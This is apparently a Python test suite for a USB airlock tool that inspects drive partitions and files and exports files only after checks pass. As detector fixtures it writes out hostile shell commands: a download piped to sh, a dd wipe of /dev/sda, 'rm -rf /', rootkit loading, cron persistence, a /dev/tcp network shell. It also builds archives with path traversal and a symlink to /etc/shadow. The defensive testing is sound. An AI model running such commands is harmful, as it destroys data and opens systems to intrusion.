# SPDX-License-Identifier: GPL-3.0-or-later
"""USB Airlock tests: storage structure, static content inspection, and RED -> GREEN end to end.

The end-to-end tests run the real sandboxed workers (structure and content
inspection get their descriptors passed in). Mounting and ClamAV are
replaced by fakes: real mounts and clamscan are hardware-gate items.
"""

import hashlib
import io
import os
import shutil
import stat
import struct
import sys
import tarfile
import tempfile
import unittest
import uuid
import zipfile
import zlib
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))

from usbguardian.airlock import content as C  # noqa: E402
from usbguardian.airlock.handlers import parse_clamscan  # noqa: E402
from usbguardian.airlock.service import AirlockService, Limits  # noqa: E402
from usbguardian.airlock.structure import ESP_GUID, inspect_structure  # noqa: E402
from usbguardian.app import build_services  # noqa: E402
from usbguardian.common import errors as E  # noqa: E402
from usbguardian.common.canonical import canonical_loads  # noqa: E402
from usbguardian.identity.sshsig import tool_verify  # noqa: E402
from usbguardian.runtime import authz  # noqa: E402

MiB = 1024 * 1024
BT = chr(0x60)
ALL_CAPS = sorted(authz.CAPABILITIES)


# -- disk image builders --------------------------------------------------------------------------

def fat32_boot():
    b = bytearray(512)
    b[0:3] = b"\xeb\x58\x90"
    b[82:90] = b"FAT32   "
    b[510:512] = b"\x55\xaa"
    return bytes(b)


def mbr_image(parts, size=8 * MiB, boot_code=False):
    """parts: (type, start_lba, count, bootable)."""
    img = bytearray(size)
    if boot_code:
        img[0:4] = b"\xfa\x33\xc0\x8e"
    for i, (ptype, start, count, boot) in enumerate(parts):
        e = 446 + 16 * i
        img[e] = 0x80 if boot else 0
        img[e + 4] = ptype
        struct.pack_into("<II", img, e + 8, start, count)
        if ptype in (0x0B, 0x0C) and start * 512 + 512 <= size:
            img[start * 512:start * 512 + 512] = fat32_boot()
    img[510:512] = b"\x55\xaa"
    return img


def gpt_image(parts, size=8 * MiB, corrupt_crc=False):
    """parts: (type_guid, first_lba, last_lba, name)."""
    img = mbr_image([(0xEE, 1, size // 512 - 1, False)], size)
    total = size // 512
    entries = bytearray(128 * 128)
    for i, (tguid, first, last, name) in enumerate(parts):
        e = i * 128
        entries[e:e + 16] = uuid.UUID(tguid).bytes_le
        entries[e + 16:e + 32] = uuid.uuid4().bytes_le
        struct.pack_into("<QQQ", entries, e + 32, first, last, 0)
        enc = name.encode("utf-16-le")[:72]
        entries[e + 56:e + 56 + len(enc)] = enc
        img[first * 512:first * 512 + 512] = fat32_boot()
    header = bytearray(512)
    header[0:8] = b"EFI PART"
    struct.pack_into("<IIIIQQQQ", header, 8, 0x10000, 92, 0, 0, 1, total - 1, 34, total - 34)
    header[56:72] = uuid.uuid4().bytes_le
    struct.pack_into("<QIII", header, 72, 2, 128, 128, zlib.crc32(bytes(entries)) & 0xFFFFFFFF)
    crc = zlib.crc32(bytes(header[:92])) & 0xFFFFFFFF
    struct.pack_into("<I", header, 16, crc ^ (1 if corrupt_crc else 0))
    img[512:1024] = header
    img[1024:1024 + len(entries)] = entries
    return img


def reader(img):
    return lambda off, n: bytes(img[off:off + n])


def codes(findings):
    return {f["code"] for f in findings}


class StructureTests(unittest.TestCase):
    def test_simple_mbr_fat32(self):
        img = mbr_image([(0x0C, 2048, 8192, False)])
        r = inspect_structure(reader(img), len(img))
        self.assertEqual(r["scheme"], "mbr")
        self.assertEqual([(p["index"], p["filesystem"], p["start"]) for p in r["partitions"]], [(1, "vfat", MiB)])
        self.assertEqual(r["findings"], [])

    def test_boot_structures_flagged(self):
        img = mbr_image([(0x0C, 2048, 4096, True), (0xEF, 8192, 4096, False)], boot_code=True)
        found = codes(inspect_structure(reader(img), len(img))["findings"])
        self.assertTrue({"BOOT_FLAG", "MBR_BOOT_CODE", "EFI_SYSTEM_PARTITION"} <= found, found)

    def test_overlap_and_out_of_range_block(self):
        img = mbr_image([(0x0C, 2048, 8192, False), (0x0C, 4096, 2048, False)])
        self.assertIn("PARTITIONS_OVERLAP", codes(inspect_structure(reader(img), len(img))["findings"]))
        img = mbr_image([(0x0C, 2048, 10 ** 7, False)])
        self.assertIn("PARTITION_OUT_OF_RANGE", codes(inspect_structure(reader(img), len(img))["findings"]))

    def test_gpt_esp_and_crc(self):
        parts = [(ESP_GUID, 2048, 4095, "EFI"), ("ebd0a0a2-b9e5-4433-87c0-68b6b72699c7", 4096, 12287, "DATA")]
        img = gpt_image(parts)
        r = inspect_structure(reader(img), len(img))
        self.assertEqual(r["scheme"], "gpt")
        self.assertEqual([p["type"] for p in r["partitions"]], ["efi_system", "basic_data"])
        self.assertIn("EFI_SYSTEM_PARTITION", codes(r["findings"]))
        self.assertNotIn("GPT_HEADER_CRC", codes(r["findings"]))
        bad = gpt_image(parts, corrupt_crc=True)
        self.assertIn("GPT_HEADER_CRC", codes(inspect_structure(reader(bad), len(bad))["findings"]))
        hybrid = gpt_image(parts)
        hybrid[446 + 16 + 4] = 0x0C  # a second, non-protective MBR entry
        self.assertIn("HYBRID_MBR", codes(inspect_structure(reader(hybrid), len(hybrid))["findings"]))

    def test_superfloppy_and_garbage(self):
        img = bytearray(4 * MiB)
        img[0:512] = fat32_boot()
        r = inspect_structure(reader(img), len(img))
        self.assertEqual((r["scheme"], r["whole_filesystem"]), ("superfloppy", "vfat"))
        junk = bytearray(os.urandom(1 * MiB))
        junk[510:512] = b"\x00\x00"
        self.assertIn("NO_PARTITION_TABLE", codes(inspect_structure(reader(junk), len(junk))["findings"]))


class ContentTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.n = 0

    def tearDown(self):
        self.tmp.cleanup()

    def inspect(self, data, name="file.txt"):
        self.n += 1
        path = Path(self.tmp.name) / ("f%d" % self.n)
        path.write_bytes(data)
        fd = os.open(path, os.O_RDONLY)
        try:
            return C.inspect_file(fd, name)
        finally:
            os.close(fd)

    def state(self, res, scanner="clean"):
        return C.item_state(res["type"], res["findings"], {"status": scanner, "signature": ""})

    def test_plain_text_passes(self):
        res = self.inspect(b"hello\nworld\n")
        self.assertEqual((res["type"], self.state(res)), ("text", "PASS"))

    def test_shell_static_review(self):
        script = "\n".join([
            "#!/bin/bash", "x=" + BT + "id" + BT, "curl -s http://x/y | sh", "dd if=/dev/zero of=/dev/sda bs=1M",
            "mkfs.vfat /dev/sdb1", "efibootmgr -c", "echo '* * * * * root x' >> /etc/crontab", "eval \"$y\"",
            "bash -c 'id'", "insmod rootkit.ko", "chmod u+s /tmp/x", "echo aGVsbG8= | base64 -d", "rm -rf /",
            "unshare -r", "mount -o remount,rw /", "cp x /etc/udev/rules.d/", "echo 'deb http://evil/' >> "
            "/etc/apt/sources.list", "flashrom -w x", "exec 3<>/dev/tcp/1.2.3.4/80"])
        res = self.inspect(script.encode(), "tool.sh")
        self.assertEqual(res["type"], "script_shell")
        expected = {"LEGACY_BACKTICK", "DOWNLOAD_PIPED_TO_SHELL", "DD", "RAW_BLOCK_WRITE", "FILESYSTEM_TOOL",
                    "BOOT_FIRMWARE", "CRON_PERSISTENCE", "EVAL", "EXEC", "SHELL_DASH_C", "MODULE_LOADING",
                    "PRIVILEGE_ESCALATION", "ENCODED_PAYLOAD", "DESTRUCTIVE_REMOVAL", "NAMESPACE_CHROOT",
                    "MOUNT_OPERATION", "UDEV_PERSISTENCE", "PACKAGE_REPOSITORY", "FIRMWARE_FLASH", "NETWORK_SHELL",
                    "BLOCK_DEVICE_PATH"}
        self.assertTrue(expected <= codes(res["findings"]), expected - codes(res["findings"]))
        self.assertEqual(self.state(res), "REVIEW_REQUIRED")  # findings do not mean malware

    def test_powershell_obfuscation(self):
        res = self.inspect(("I" + BT + "nvoke-Expression $x\npowershell -enc " + "A" * 40).encode(), "a.ps1")
        self.assertEqual(res["type"], "script_powershell")
        self.assertTrue({"ESCAPE_CHARACTER_OBFUSCATION", "INVOKE_EXPRESSION", "ENCODED_COMMAND"}
                        <= codes(res["findings"]))

    def test_type_from_content_not_extension(self):
        res = self.inspect(b"\x7fELF\x02\x01\x01" + b"\x00" * 100, "notes.txt")
        self.assertEqual(res["type"], "executable_elf")
        self.assertIn("EXTENSION_MISMATCH", codes(res["findings"]))
        self.assertEqual(self.state(res), "BLOCKED")
        self.assertEqual(self.state(self.inspect(os.urandom(4096), "x.dat")), "UNSUPPORTED_FILE_TYPE")
        iso = bytearray(0x9000)
        iso[0x8001:0x8006] = b"CD001"
        self.assertEqual(self.inspect(bytes(iso), "a.iso")["type"], "disk_image")

    def test_unicode_tricks(self):
        res = self.inspect("safe ‮exe.txt\nzero​width\n".encode(), "a.txt")
        self.assertTrue({"UNICODE_BIDI_CONTROL", "INVISIBLE_CHARACTER"} <= codes(res["findings"]))

    def zip_bytes(self, members, compression=zipfile.ZIP_DEFLATED):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression) as zf:
            for name, data in members:
                zf.writestr(name, data)
        return buf.getvalue()

    def test_archives(self):
        ok = self.inspect(self.zip_bytes([("a.txt", b"x"), ("inner.zip", b"y"), ("run.exe", b"z")]), "a.zip")
        self.assertEqual(ok["type"], "zip")
        self.assertTrue({"NESTED_ARCHIVE", "EXECUTABLE_MEMBER"} <= codes(ok["findings"]))
        self.assertEqual(self.state(ok), "REVIEW_REQUIRED")
        evil = self.inspect(self.zip_bytes([("../../etc/passwd", b"x")]), "a.zip")
        self.assertEqual(self.state(evil), "STRUCTURAL_ANOMALY")
        bomb = self.inspect(self.zip_bytes([("zeros", b"\x00" * (24 * MiB))]), "a.zip")
        self.assertIn("ARCHIVE_BOMB_SUSPECTED", codes(bomb["findings"]))
        macro = self.inspect(self.zip_bytes([("[Content_Types].xml", b"<x/>"), ("word/vbaProject.bin", b"v")]),
                             "a.docm")
        self.assertEqual(macro["type"], "office_ooxml")
        self.assertIn("OFFICE_MACROS", codes(macro["findings"]))
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            link = tarfile.TarInfo("ln")
            link.type, link.linkname = tarfile.SYMTYPE, "../../../etc/shadow"
            tf.addfile(link)
        res = self.inspect(buf.getvalue(), "a.tar.gz")
        self.assertEqual(res["type"], "tar")
        self.assertIn("ARCHIVE_LINK_ESCAPE", codes(res["findings"]))
        self.assertEqual(self.state(res), "STRUCTURAL_ANOMALY")
        self.assertEqual(self.state(self.inspect(b"\x1f\x8b\x08\x00garbage", "a.gz")), "UNSUPPORTED_FILE_TYPE")

    def test_pdf_and_scanner_states(self):
        res = self.inspect(b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /JavaScript (app.alert(1)) >>", "a.pdf")
        self.assertTrue({"PDF_JAVASCRIPT", "PDF_AUTO_ACTION"} <= codes(res["findings"]))
        text = self.inspect(b"plain")
        self.assertEqual(self.state(text, "found"), "MALWARE_DETECTED_BY_SCANNER")
        self.assertEqual(self.state(text, "unavailable"), "BLOCKED")  # scanner failure fails closed
        self.assertEqual(self.state(text, "error"), "BLOCKED")
        self.assertEqual(C.item_state(text["type"], text["findings"], None), "BLOCKED")

    def test_parse_clamscan(self):
        out = "/dev/fd/5: OK\n/dev/fd/6: Eicar-Test-Signature FOUND\n"
        self.assertEqual([r["status"] for r in parse_clamscan(out, [5, 6, 7], 1)], ["clean", "found", "error"])
        self.assertEqual([r["status"] for r in parse_clamscan(out, [5, 6], 2)], ["error", "error"])
        self.assertEqual([r["status"] for r in parse_clamscan(out, [5, 6], 0)], ["clean", "error"])


# -- end to end ----------------------------------------------------------------------------------

class FakeMounter:
    """Stands in for a read-only mount: fills the target with the fixture tree, empties it on unmount."""

    def __init__(self, tree):
        self.tree = tree
        self.calls = []

    def mount(self, device, fstype, target, expected_dev):
        self.calls.append((device, fstype, expected_dev))
        for entry in os.listdir(self.tree):
            src = os.path.join(self.tree, entry)
            if os.path.isdir(src) and not os.path.islink(src):
                shutil.copytree(src, os.path.join(target, entry), symlinks=True)
            else:
                shutil.copy2(src, os.path.join(target, entry), follow_symlinks=False)
        os.mkfifo(os.path.join(target, "pipe"))

    def unmount(self, target):
        for entry in os.listdir(target):
            path = os.path.join(target, entry)
            if os.path.isdir(path) and not os.path.islink(path):
                shutil.rmtree(path)
            else:
                os.unlink(path)


def fake_scanner(sdir_holder):
    def scan(fds):
        results = []
        for fd in fds:
            data = os.pread(fd, 1 * MiB, 0)
            found = b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE" in data
            results.append({"status": "found" if found else "clean", "signature": "Eicar-Test" if found else ""})
        return {"available": True, "version": "FakeClam 1.0", "results": results}
    return scan


RED_FP, GREEN_FP = "a" * 64, "b" * 64


class AirlockFlowTests(unittest.TestCase):
    def setUp(self):
        from test_runtime import launcher
        self.launcher = launcher()
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        os.chmod(self.root, 0o755)
        self.image = self.root / "red.img"
        self.image.write_bytes(bytes(mbr_image([(0x0C, 2048, 8192, False)])))
        tree = self.root / "tree"
        (tree / "docs").mkdir(parents=True)
        (tree / "docs" / "readme.txt").write_bytes(b"hello from RED\n")
        (tree / "setup.sh").write_bytes(b"#!/bin/sh\ndd if=/dev/zero of=/dev/sda\n")
        os.chmod(tree / "setup.sh", 0o755)
        (tree / "photo.txt").write_bytes(b"\x7fELF\x02\x01" + b"\x00" * 64)
        (tree / "eicar.com.txt").write_bytes(b"X5O!P%@AP EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
        (tree / "System Volume Information").mkdir()
        (tree / "System Volume Information" / "IndexerVolumeGuid").write_bytes(b"x")
        os.symlink("/etc/shadow", tree / "shadow-link")
        self.mounter = FakeMounter(str(tree))
        self.attached = []
        self.green_disk = "sdg"
        self.findings = []
        self.fp = {"sdr": RED_FP, "sdg": GREEN_FP}
        self.green = self.root / "green"
        self.green.mkdir()
        self.airlock = AirlockService(
            self.root / "state-airlock", self.launcher, worker_gid=self.launcher.worker_gid,
            inspect_device=self.report, list_devices=lambda: self.attached,
            open_device=lambda path, dev: os.open(self.image, os.O_RDONLY | os.O_CLOEXEC),
            mounter=self.mounter, scanner=fake_scanner(None), device_of_fd=lambda fd: self.green_disk,
            mount_root=self.root / "mnt", limits=Limits(max_file_bytes=MiB))
        self.ids = 0

    def tearDown(self):
        self.tmp.cleanup()

    def report(self, kname):
        return {"device": {"kname": kname, "dev": "8:16", "size_bytes": 8 * MiB, "transport": "usb",
                           "logical_block_size": 512, "physical_block_size": 512,
                           "usb": {"vendor_id": "0781", "product_id": "5581", "manufacturer": "SanDisk",
                                   "product": "Ultra", "serial": "1234", "interfaces": [["08", "06", "50"]]},
                           "partitions": [{"kname": kname + "1", "dev": "8:17", "start_sectors": 2048,
                                           "size_sectors": 8192}]},
                "fingerprint": self.fp[kname], "findings": list(self.findings if kname == "sdr" else []),
                "candidate": True}

    def acquire(self, **kw):
        return self.airlock.acquire(authz.Principal("owner", 0, frozenset(), frozenset()),
                                    dict({"kname": "sdr", "fingerprint": RED_FP, "partition": 1,
                                          "accept_review": False}, **kw))

    def export(self, sid, items, ack=True, green_fp=GREEN_FP):
        class Ctx:
            def __init__(self, fd):
                self.fd = fd

            def take_fds(self):
                return [self.fd]
        fd = os.open(self.green, os.O_RDONLY | os.O_DIRECTORY)
        return self.airlock.export(authz.Principal("owner", 0, frozenset(), frozenset()),
                                   {"session_id": sid, "green_kname": "sdg", "green_fingerprint": green_fp,
                                    "acknowledge_review": ack, "items": items}, Ctx(fd))

    def items(self, sid):
        return {it["source_path"]: it for it in self.airlock._load(sid)["items"]}

    def test_inspect_and_red_gates(self):
        red = self.airlock.inspect(None, {"kname": "sdr"})
        self.assertEqual((red["verdict"], red["structure"]["scheme"]), ("PASS", "mbr"))
        with self.assertRaises(E.SecurityViolation) as cm:
            self.acquire(fingerprint="c" * 64)  # removed or reassigned since inspection
        self.assertEqual(cm.exception.code, "DEVICE_IDENTITY_CHANGED")
        self.findings = [{"code": "HID_INTERFACE", "severity": "BLOCKING", "detail": "keyboard"}]
        with self.assertRaises(E.SecurityViolation) as cm:  # BadUSB: storage that is also a keyboard
            self.acquire()
        self.assertEqual(cm.exception.code, "RED_BLOCKED")
        self.findings = [{"code": "UNUSUAL", "severity": "REVIEW", "detail": "x"}]
        with self.assertRaises(E.ValidationError):
            self.acquire()
        self.assertEqual(self.mounter.calls, [])  # nothing was mounted

    def test_acquire_inspect_export(self):
        summary = self.acquire()
        self.assertEqual(self.mounter.calls, [("/dev/sdr1", "vfat", "8:17")])
        sid = summary["session_id"]
        items = self.items(sid)
        self.assertEqual(sorted(items), ["docs/readme.txt", "eicar.com.txt", "photo.txt", "setup.sh"])
        self.assertEqual(items["docs/readme.txt"]["state"], "PASS")
        self.assertEqual(items["setup.sh"]["state"], "REVIEW_REQUIRED")
        self.assertEqual(items["photo.txt"]["state"], "BLOCKED")
        self.assertEqual(items["eicar.com.txt"]["state"], "MALWARE_DETECTED_BY_SCANNER")
        skipped = {s["reason"] for s in self.airlock._load(sid)["skipped"]}
        self.assertEqual(skipped, {"SYMLINK_NOT_FOLLOWED", "SYSTEM_DIRECTORY", "SPECIAL_FILE"})
        for it in items.values():
            mode = os.stat(self.root / "state-airlock" / sid / "q" / it["quarantine"]).st_mode
            self.assertFalse(mode & 0o111)  # never executable in quarantine
        self.assertIn("SOURCE_EXECUTABLE_BIT", codes(items["setup.sh"]["findings"]))

        def ref(name):
            return {"item": items[name]["item"], "sha256": items[name]["sha256"]}
        for bad in ("photo.txt", "eicar.com.txt"):
            with self.assertRaises(E.SecurityViolation) as cm:
                self.export(sid, [ref(bad)])
            self.assertEqual(cm.exception.code, "ITEM_NOT_EXPORTABLE")
        with self.assertRaises(E.ValidationError):  # review not acknowledged
            self.export(sid, [ref("setup.sh")], ack=False)
        with self.assertRaises(E.IntegrityError):  # approved hash differs
            self.export(sid, [{"item": items["setup.sh"]["item"], "sha256": "0" * 64}])
        self.attached = [{"fingerprint": RED_FP}]
        with self.assertRaises(E.SecurityViolation) as cm:
            self.export(sid, [ref("docs/readme.txt")])
        self.assertEqual(cm.exception.code, "RED_STILL_ATTACHED")
        self.attached = []
        with self.assertRaises(E.SecurityViolation) as cm:
            self.export(sid, [ref("docs/readme.txt")], green_fp="d" * 64)
        self.assertEqual(cm.exception.code, "DESTINATION_MISMATCH")
        self.green_disk = "sdh"
        with self.assertRaises(E.SecurityViolation):  # directory not on the approved GREEN device
            self.export(sid, [ref("docs/readme.txt")])
        self.green_disk = "sdg"
        self.assertEqual(os.listdir(self.green), [])  # nothing written by any refused export
        result = self.export(sid, [ref("docs/readme.txt"), ref("setup.sh")])
        self.assertEqual(result["result"], "verified")
        out = self.green / result["folder"]
        self.assertEqual(sorted(os.listdir(out)), ["airlock-manifest.json", "readme.txt", "setup.sh"])
        self.assertEqual((out / "readme.txt").read_bytes(), b"hello from RED\n")
        self.assertFalse(os.stat(out / "setup.sh").st_mode & 0o111)
        manifest = canonical_loads((out / "airlock-manifest.json").read_bytes().rstrip(b"\n"))
        for f in manifest["export"]["files"]:
            self.assertEqual(f["quarantine_sha256"], f["destination_sha256"])
            self.assertEqual(hashlib.sha256((out / f["destination_name"]).read_bytes()).hexdigest(),
                             f["destination_sha256"])
        self.assertEqual(manifest["source_device"]["fingerprint"], RED_FP)
        with self.assertRaises(FileExistsError):  # never overwrites an earlier export
            self.export(sid, [ref("docs/readme.txt")])

    def test_changed_after_inspection_and_scanner_failure(self):
        sid = self.acquire()["session_id"]
        it = self.items(sid)["docs/readme.txt"]
        qfile = self.root / "state-airlock" / sid / "q" / it["quarantine"]
        qfile.write_bytes(b"swapped after inspection\n")
        with self.assertRaises(E.IntegrityError) as cm:
            self.export(sid, [{"item": it["item"], "sha256": it["sha256"]}])
        self.assertEqual(cm.exception.code, "FILE_CHANGED_AFTER_INSPECTION")
        folder = self.green / ("GUARDIAN-AIRLOCK-" + sid)
        self.assertEqual(os.listdir(folder), [])  # the partial copy was removed
        self.airlock.scanner = lambda fds: {"available": False, "version": "",
                                            "results": [{"status": "unavailable", "signature": ""} for _ in fds]}
        sid2 = self.acquire()["session_id"]
        self.assertEqual({i["state"] for i in self.items(sid2).values()}, {"BLOCKED"})  # no scanner: fail closed

    def test_broker_requires_owner_touch(self):
        svc = build_services(self.launcher, self.root / "state", sig_check=tool_verify, airlock=self.airlock)
        for op, params in (("airlock.acquire", {"kname": "sdr", "fingerprint": RED_FP, "partition": 1,
                                                "accept_review": False}),
                           ("airlock.discard", {"session_id": "20260101T000000Z-00000000"})):
            principal = authz.Principal("p", os.geteuid(), frozenset(ALL_CAPS), frozenset({"peer_uid"}))
            resp = svc.broker.handle(principal, {"v": 1, "type": "request", "id": "r1", "op": op, "params": params})
            self.assertEqual(resp["error"]["code"], "PERMISSION_DENIED")
        self.assertIn(authz.FACTOR_OWNER_KEY, authz.CAPABILITIES["airlock.export"].required_factors)
        self.assertNotIn(authz.FACTOR_OWNER_KEY, authz.CAPABILITIES["airlock.read"].required_factors)


if __name__ == "__main__":
    unittest.main()
